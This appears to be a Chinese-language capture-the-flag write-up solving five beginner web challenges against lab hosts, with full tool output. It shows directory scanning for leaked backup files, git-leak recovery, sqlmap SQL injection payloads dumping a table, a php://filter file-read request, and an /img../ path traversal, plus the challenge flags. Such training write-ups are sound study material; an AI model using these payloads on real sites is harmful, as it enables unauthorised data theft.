### [常见的搜集](https://ce.pwnthebox.com/challenges?id=279)

> 信息搜集之所以重要，是因为其往往会带给我们一些意想不到的东西。

使用`dirsearch`扫描靶机目录，发现`.DS_Store`，`robots.txt`，`.index.php.swp`，`index.php~ `这几个可能存在敏感信息的文件。

`.DS_Store`是`MacOS`中的配置文件；`.index.php.swp`是`vim`备份文件，可以使用`vim -r`命令恢复文件的内容；`index.php~`是`php`备份文件；`robots.txt`是禁止爬虫相关文件，常用来记录一些目录和`CMS`版本信息。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ dirsearch -u https://1254-da963f56-3e15-402a-8567-026008eee3ed.do-not-trust.hacking.run

  _|. _ _  _  _  _ _|_    v0.4.2                                                                          
 (_||| _) (/_(_|| (_| )                                                                                   
                                                                                                          
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/tyd/.dirsearch/reports/1254-da963f56-3e15-402a-8567-026008eee3ed.do-not-trust.hacking.run/_22-08-17_08-20-08.txt

Error Log: /home/tyd/.dirsearch/logs/errors-22-08-17_08-20-08.log

Target: https://1254-da963f56-3e15-402a-8567-026008eee3ed.do-not-trust.hacking.run/

[08:20:09] Starting: 
[08:20:10] 200 -   10KB - /.DS_Store                                       
[08:20:11] 403 -  331B  - /.ht_wsr.txt                                     
[08:20:11] 403 -  331B  - /.htaccess.orig
[08:20:11] 403 -  331B  - /.htaccess.bak1
[08:20:11] 403 -  331B  - /.htaccess.save
[08:20:11] 403 -  331B  - /.htaccess.sample
[08:20:11] 403 -  331B  - /.htaccess_extra
[08:20:11] 403 -  331B  - /.htaccess_sc
[08:20:11] 403 -  331B  - /.htaccessOLD
[08:20:11] 403 -  331B  - /.htaccess_orig
[08:20:11] 403 -  331B  - /.htm                                            
[08:20:11] 403 -  331B  - /.htaccessBAK
[08:20:11] 403 -  331B  - /.htaccessOLD2
[08:20:11] 403 -  331B  - /.html
[08:20:11] 403 -  331B  - /.htpasswd_test
[08:20:11] 403 -  331B  - /.htpasswds
[08:20:11] 403 -  331B  - /.httr-oauth
[08:20:11] 200 -   12KB - /.index.php.swp                                  
[08:20:25] 200 -    2KB - /index.php                                        
[08:20:25] 200 -    2KB - /index.php~                                       
[08:20:25] 200 -    2KB - /index.php/login/                                 
[08:20:32] 200 -   47B  - /robots.txt                                       
[08:20:32] 403 -  331B  - /server-status                                    
[08:20:32] 403 -  331B  - /server-status/

Task Completed
```

`vim -r .index.php.swp`可以看到以下关键信息，得到`flag3:p0rtant_hack}`。

```php+HTML
<p>hack fun</p>
<?php echo 'flag3:p0rtant_hack}';?>
```

访问`/index.php~`可以看到`flag2:s_v3ry_im`。访问`/robots.txt`可以看到以下信息：

```html
User-agent: *
Disallow:
/flag1_is_her3_fun.txt
```

访问`/flag1_is_her3_fun.txt`得到`flag1:n1book{info_1`，拼接以上信息可得`flag`：`n1book{info_1s_v3ry_imp0rtant_hack}`。

------

### [粗心的小李](https://ce.pwnthebox.com/challenges?id=280)

常规的`git`泄露，直接运用现成工具获取网站源码或`flag`，比如https://github.com/denny0223/scrabble。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/tools]
└─$ ./scrabble https://1254-3931ae23-9b01-4ec8-8e51-1039f8cb43d5.do-not-trust.hacking.run
提示：使用 'master' 作为初始分支的名称。这个默认分支名称可能会更改。要在新仓库中
提示：配置使用初始分支名，并消除这条警告，请执行：
提示：
提示：  git config --global init.defaultBranch <名称>
提示：
提示：除了 'master' 之外，通常选定的名字有 'main'、'trunk' 和 'development'。
提示：可以通过以下命令重命名刚创建的分支：
提示：
提示：  git branch -m <name>
已初始化空的 Git 仓库于 /home/tyd/ctf/tools/.git/
parseCommit 213b7e386e9b0b406d91fae58bf8be11a58c3f88
downloadBlob 213b7e386e9b0b406d91fae58bf8be11a58c3f88
parseTree f46fbac4149604ca13a765950f9a2d1fd8c1c7ad
downloadBlob f46fbac4149604ca13a765950f9a2d1fd8c1c7ad
downloadBlob 1e0db5d96b5cc9785055c14bbec0e7ad14f48151
HEAD 现在位于 213b7e3 flag
```

`cat index.html`即可找到关键信息`n1book{git_looks_s0_easyfun}`，提交即可。

------

### [SQL注入-1](https://ce.pwnthebox.com/challenges?id=281)

直接用`sqlmap`进行爆破，`--current-db`获得当前数据库的名字`note`：

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ sqlmap -u "https://1254-b717b966-a0b5-43fe-b410-f15797bb4381.do-not-trust.hacking.run/index.php?id=1" --current-db
        ___
       __H__                                                                                              
 ___ ___["]_____ ___ ___  {1.6.7#stable}                                                                  
|_ -| . [']     | .'| . |                                                                                 
|___|_  ["]_|_|_|__,|  _|                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:17:34 /2022-08-17/

[09:17:35] [INFO] resuming back-end DBMS 'mysql' 
[09:17:35] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5975=5975 AND 'OwTY'='OwTY

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9341 FROM (SELECT(SLEEP(5)))ejmq) AND 'mlWM'='mlWM

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5185' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7171,0x514f4844786a687267776b504557574e487759506c79594248626342486779595a766c64674a7863,0x71717a7071)-- -
---
[09:17:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:17:35] [INFO] fetching current database
current database: 'note'
[09:17:35] [INFO] fetched data logged to text files under '/home/tyd/.local/share/sqlmap/output/1254-b717b966-a0b5-43fe-b410-f15797bb4381.do-not-trust.hacking.run'                                                 

[*] ending @ 09:17:35 /2022-08-17/
```

得到数据库名`note`后，继续输入`-D note --tables`爆破表信息：

```bash
sqlmap -u "https://1254-b717b966-a0b5-43fe-b410-f15797bb4381.do-not-trust.hacking.run/index.php?id=1" -D note --tables
        ___
       __H__                                                                                              
 ___ ___["]_____ ___ ___  {1.6.7#stable}                                                                  
|_ -| . [,]     | .'| . |                                                                                 
|___|_  [']_|_|_|__,|  _|                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:22:07 /2022-08-17/

[09:22:07] [INFO] resuming back-end DBMS 'mysql' 
[09:22:07] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5975=5975 AND 'OwTY'='OwTY

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9341 FROM (SELECT(SLEEP(5)))ejmq) AND 'mlWM'='mlWM

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5185' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7171,0x514f4844786a687267776b504557574e487759506c79594248626342486779595a766c64674a7863,0x71717a7071)-- -
---
[09:22:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:22:07] [INFO] fetching tables for database: 'note'
[09:22:08] [INFO] resumed: 'fl4g'
[09:22:08] [INFO] resumed: 'notes'
Database: note                                                                                           
[2 tables]
+-------+
| fl4g  |
| notes |
+-------+

[09:22:08] [INFO] fetched data logged to text files under '/home/tyd/.local/share/sqlmap/output/1254-b717b966-a0b5-43fe-b410-f15797bb4381.do-not-trust.hacking.run'                                                 

[*] ending @ 09:22:08 /2022-08-17/
```

知道有个叫`fl4g`的表后，使用`-D note -T fl4g --columns`查看该表的字段信息：

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ sqlmap -u "https://1254-b717b966-a0b5-43fe-b410-f15797bb4381.do-not-trust.hacking.run/index.php?id=1" -D note -T fl4g --columns
        ___
       __H__                                                                                              
 ___ ___[,]_____ ___ ___  {1.6.7#stable}                                                                  
|_ -| . [)]     | .'| . |                                                                                 
|___|_  [.]_|_|_|__,|  _|                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:23:58 /2022-08-17/

[09:23:58] [INFO] resuming back-end DBMS 'mysql' 
[09:23:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5975=5975 AND 'OwTY'='OwTY

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9341 FROM (SELECT(SLEEP(5)))ejmq) AND 'mlWM'='mlWM

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5185' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7171,0x514f4844786a687267776b504557574e487759506c79594248626342486779595a766c64674a7863,0x71717a7071)-- -
---
[09:23:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:23:58] [INFO] fetching columns for table 'fl4g' in database 'note'
Database: note
Table: fl4g
[1 column]
+---------+-------------+
| Column  | Type        |
+---------+-------------+
| fllllag | varchar(40) |
+---------+-------------+

[09:23:59] [INFO] fetched data logged to text files under '/home/tyd/.local/share/sqlmap/output/1254-b717b966-a0b5-43fe-b410-f15797bb4381.do-not-trust.hacking.run'                                                 

[*] ending @ 09:23:59 /2022-08-17/
```

查询到表中有个`fllllag`的字段后，使用`-D note -T fl4g -C fllllag --dump`查询该字段的数据信息：

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ sqlmap -u "https://1254-b717b966-a0b5-43fe-b410-f15797bb4381.do-not-trust.hacking.run/index.php?id=1" -D note -T fl4g -C fllllag --dump
        ___
       __H__                                                                                              
 ___ ___[(]_____ ___ ___  {1.6.7#stable}                                                                  
|_ -| . [,]     | .'| . |                                                                                 
|___|_  [']_|_|_|__,|  _|                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:26:33 /2022-08-17/

[09:26:33] [INFO] resuming back-end DBMS 'mysql' 
[09:26:33] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 5975=5975 AND 'OwTY'='OwTY

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 9341 FROM (SELECT(SLEEP(5)))ejmq) AND 'mlWM'='mlWM

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5185' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7171,0x514f4844786a687267776b504557574e487759506c79594248626342486779595a766c64674a7863,0x71717a7071)-- -
---
[09:26:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:26:33] [INFO] fetching entries of column(s) 'fllllag' for table 'fl4g' in database 'note'
Database: note
Table: fl4g
[1 entry]
+---------------------------------+
| fllllag                         |
+---------------------------------+
| n1book{union_select_is_so_cool} |
+---------------------------------+

[09:26:34] [INFO] table 'note.fl4g' dumped to CSV file '/home/tyd/.local/share/sqlmap/output/1254-b717b966-a0b5-43fe-b410-f15797bb4381.do-not-trust.hacking.run/dump/note/fl4g.csv'                                 
[09:26:34] [INFO] fetched data logged to text files under '/home/tyd/.local/share/sqlmap/output/1254-b717b966-a0b5-43fe-b410-f15797bb4381.do-not-trust.hacking.run'                                                 

[*] ending @ 09:26:34 /2022-08-17/
```

提交`n1book{union_select_is_so_cool}`即可。

------

### [afr_1](https://ce.pwnthebox.com/challenges?type=6&page=1&id=283)

使用`dirsearch`扫描靶机目录，发现`flag.php`，直接访问得到回显`no no no`。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ dirsearch -u https://1254-f911ecc1-794c-450b-88b5-3ea1109f3b20.do-not-trust.hacking.run         

  _|. _ _  _  _  _ _|_    v0.4.2                                                                          
 (_||| _) (/_(_|| (_| )                                                                                   
                                                                                                          
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/tyd/.dirsearch/reports/1254-f911ecc1-794c-450b-88b5-3ea1109f3b20.do-not-trust.hacking.run/_22-08-17_10-34-26.txt

Error Log: /home/tyd/.dirsearch/logs/errors-22-08-17_10-34-26.log

Target: https://1254-f911ecc1-794c-450b-88b5-3ea1109f3b20.do-not-trust.hacking.run/

[10:34:26] Starting: 
[10:34:28] 403 -  331B  - /.ht_wsr.txt                                     
[10:34:28] 403 -  331B  - /.htaccess.bak1                                  
[10:34:28] 403 -  331B  - /.htaccess.sample
[10:34:28] 403 -  331B  - /.htaccess.orig
[10:34:28] 403 -  331B  - /.htaccess.save
[10:34:28] 403 -  331B  - /.htaccess_extra
[10:34:28] 403 -  331B  - /.htaccess_orig
[10:34:28] 403 -  331B  - /.htaccess_sc
[10:34:28] 403 -  331B  - /.htaccessBAK
[10:34:28] 403 -  331B  - /.htaccessOLD
[10:34:29] 403 -  331B  - /.htm
[10:34:29] 403 -  331B  - /.html
[10:34:29] 403 -  331B  - /.httr-oauth
[10:34:29] 403 -  331B  - /.htaccessOLD2
[10:34:29] 403 -  331B  - /.htpasswds
[10:34:29] 403 -  331B  - /.htpasswd_test                                  
[10:34:29] 403 -  331B  - /.php                                            
[10:34:42] 200 -    8B  - /flag.php                                         
[10:34:43] 302 -    0B  - /index.php/login/  ->  /?p=hello                  
[10:34:43] 302 -    0B  - /index.php  ->  /?p=hello                         
[10:34:50] 403 -  331B  - /server-status/                                   
[10:34:50] 403 -  331B  - /server-status                                    
                                                                             
Task Completed
```

使用`php filter`来读取`flag.php`文件中的内容，`/?p=php://filter/convert.base64-encode/resource=flag`：

```
https://1254-f911ecc1-794c-450b-88b5-3ea1109f3b20.do-not-trust.hacking.run/?p=php://filter/convert.base64-encode/resource=flag
```

得到以下回显：

```
PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9
```

进行`base64`解码得到`flag`：`n1book{afr_1_solved}`。

```bash
<?php
die('no no no');
//n1book{afr_1_solved}
```

------

### [afr_2](https://ce.pwnthebox.com/challenges?id=284)

靶机中有一张`gif`图，其路径为`/img/img.gif`，访问`/img/`一无所获，访问`/img../`可以看到以下目录：

> **Index of /img../**
>
> ```
> ../
> bin/                                               28-May-2020 04:40                   -
> boot/                                              24-Apr-2018 08:34                   -
> dev/                                               17-Aug-2022 02:43                   -
> etc/                                               17-Aug-2022 02:43                   -
> home/                                              24-Apr-2018 08:34                   -
> lib/                                               23-May-2017 11:32                   -
> lib64/                                             03-Apr-2020 17:13                   -
> media/                                             03-Apr-2020 17:12                   -
> mnt/                                               03-Apr-2020 17:12                   -
> opt/                                               03-Apr-2020 17:12                   -
> proc/                                              17-Aug-2022 02:43                   -
> root/                                              03-Apr-2020 17:14                   -
> run/                                               17-Aug-2022 02:43                   -
> sbin/                                              28-May-2020 04:40                   -
> srv/                                               03-Apr-2020 17:12                   -
> sys/                                               17-Aug-2022 02:43                   -
> tmp/                                               28-May-2020 04:40                   -
> usr/                                               03-Apr-2020 17:12                   -
> var/                                               28-May-2020 04:40                   -
> flag                                               10-Mar-2020 20:24                  20
> ```

`flag`文件中就包含了`flag`：`n1book{afr_2_solved}`。

------

